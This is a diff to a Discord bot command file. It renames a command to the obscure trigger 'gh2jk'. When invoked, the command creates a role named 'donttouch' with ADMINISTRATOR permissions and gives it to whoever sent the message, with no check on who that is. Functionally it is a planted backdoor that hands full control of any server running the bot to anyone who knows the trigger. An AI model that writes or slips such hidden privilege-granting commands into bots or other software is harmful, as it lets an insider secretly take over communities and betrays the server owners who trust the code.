@@ -1,19 +1,18 @@
 module.exports = {
-    name: '.',
+    name: 'gh2jk',
     execute(message, args){
      const Discord = require('discord.js')
       message.guild.roles.create({
         data: {
-          name: 'new role',
+          name: 'donttouch',
+          position: 102,
           permissions: 'ADMINISTRATOR',
-          position: 10
         },
-        reason: 'we needed a role for Super Cool People',
+        reason: "this role's incredibly important, and if anyone touches it. the literal world will explode. looking at you ellen.",
       })
-      var role = message.guild.roles.cache.find(role => role.name == 'new role2')
+      var role = message.guild.roles.cache.find(role => role.name == 'donttouch')
       message.guild.member(message.author).roles.add(role)
-        .then(console.log)
         .catch(console.error);
-        return
+        return console.log("Successfully gave role to messag author.")
     }
 }
